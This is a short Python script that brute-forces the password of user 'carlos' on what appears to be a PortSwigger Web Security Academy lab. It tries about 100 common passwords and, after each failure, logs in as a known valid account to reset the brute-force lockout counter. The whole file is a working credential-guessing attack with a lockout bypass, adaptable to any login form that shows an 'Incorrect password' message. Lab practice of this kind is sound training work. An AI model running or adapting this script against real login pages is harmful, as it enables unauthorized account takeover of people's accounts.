import requests

login_url = 'https://0a9c00f403f5c06481c757ce00320008.web-security-academy.net/login'

username = 'carlos'

passwords = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", 
    "1234", "111111", "1234567", "dragon", "123123", "baseball", "abc123", 
    "football", "monkey", "letmein", "shadow", "master", "666666", 
    "qwertyuiop", "123321", "mustang", "1234567890", "michael", "654321", 
    "superman", "1qaz2wsx", "7777777", "121212", "000000", "qazwsx", 
    "123qwe", "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", 
    "asdfgh", "hunter", "buster", "soccer", "harley", "batman", "andrew", 
    "tigger", "sunshine", "iloveyou", "2000", "charlie", "robert", 
    "thomas", "hockey", "ranger", "daniel", "starwars", "klaster", 
    "112233", "george", "computer", "michelle", "jessica", "pepper", 
    "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777", 
    "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua", 
    "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea", 
    "biteme", "matthew", "access", "yankees", "987654321", "dallas", 
    "austin", "thunder", "taylor", "matrix", "mobilemail", "mom", 
    "monitor", "monitoring", "montana", "moon", "moscow"
]

session = requests.Session()

print("Searching...")
for password in passwords:
    login_data = {
        'username': username,
        'password': password
    }
    print(f"Trying username: {username} and password: {password}")
    response = session.post(login_url, data=login_data)
    if "Incorrect password" not in response.text:
        print(f"Found credentials: username:{username}, password:{password}")
        break
    else:
        print(f"{password} incorrect")
        login_data = {
            'username': 'wiener',
            'password': 'peter',
        }
        session.post(login_url, data=login_data)